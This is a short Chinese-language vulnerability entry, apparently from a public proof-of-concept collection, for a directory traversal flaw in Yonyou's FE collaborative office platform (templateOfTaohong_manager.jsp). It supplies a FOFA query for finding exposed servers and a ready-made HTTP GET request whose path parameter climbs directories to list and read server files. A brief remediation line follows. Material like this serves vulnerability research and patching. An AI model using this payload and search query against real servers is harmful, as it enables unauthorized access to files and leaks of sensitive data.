---
fofa: "FE协作"
source: "OA-EXPTOOL/Lucifer1993 + afrog-pocs/zan8in"
---

# 用友 FE templateOfTaohong_manager.jsp 目录遍历漏洞

# 漏洞描述

用友 FE 协作办公平台 /system/mediafile/templateOfTaohong_manager.jsp 文件存在目录遍历漏洞。攻击者可通过 path 参数穿越目录，读取服务器上的任意文件，导致敏感信息泄露并为进一步攻击提供便利。

# 影响版本

用友 FE 协作办公平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA："FE协作"

POC/EXP：

```
GET /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

通过 path 参数中的 `../` 序列穿越到上级目录，可遍历并读取服务器目录文件。

# 漏洞修复

联系用友官方获取安全补丁，对 path 参数做路径规范化与白名单校验，禁止目录穿越。
